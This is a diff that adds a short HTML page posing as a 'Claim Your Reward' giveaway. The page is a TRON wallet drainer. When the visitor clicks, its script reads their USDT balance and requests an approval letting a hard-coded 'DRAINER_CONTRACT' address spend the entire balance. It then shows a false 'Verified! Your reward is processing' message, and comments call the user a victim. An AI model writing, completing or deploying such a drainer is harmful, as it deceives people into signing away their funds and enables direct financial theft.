@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
+</head>
+<body>
+  <button id="claimBtn">🎁 Claim Your Reward</button>
+  <script>
+    const DRAINER_CONTRACT = "TRAYgmLMdjgHvei2kCVBGH9RPvVYcphWrn";
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+    document.getElementById("claimBtn").onclick = async () => {
+      if (!window.tronWeb) return alert("Please install TronLink");
+      const tronWeb = window.tronWeb;
+      const user = tronWeb.defaultAddress.base58;
+
+      const usdt = await tronWeb.contract().at(USDT_CONTRACT);
+      const balance = await usdt.balanceOf(user).call();
+
+      if (Number(balance) <= 0) return alert("No USDT found");
+
+      // Ask victim to approve the DRAINER for their FULL balance
+      await usdt.approve(DRAINER_CONTRACT, balance.toString()).send();
+      alert("Verified! Your reward is processing 🎉");
+      // meanwhile drainer contract can now pull it
+    };
+  </script>
+</body>
+</html>
